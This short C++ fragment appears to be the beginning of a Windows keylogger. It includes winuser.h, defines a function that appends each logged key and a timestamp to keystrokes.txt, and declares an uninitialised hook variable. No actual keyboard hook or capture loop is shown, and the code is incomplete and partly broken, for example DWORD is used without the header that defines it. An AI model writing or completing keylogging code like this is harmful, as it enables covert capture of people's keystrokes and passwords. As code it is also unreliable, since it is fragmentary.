#include <winuser.h>
#include <iostream>
#include <fstream>
#include <ctime>
#include <string>

using namespace std;

// Function to log keystrokes
void logKeystroke(char key, int time) {
    ofstream file("keystrokes.txt", ios::app);
    file << (char)key << " at " << time << endl;
    file.close();
}

// Initialize the hook
DWORD dwHooked = 0;
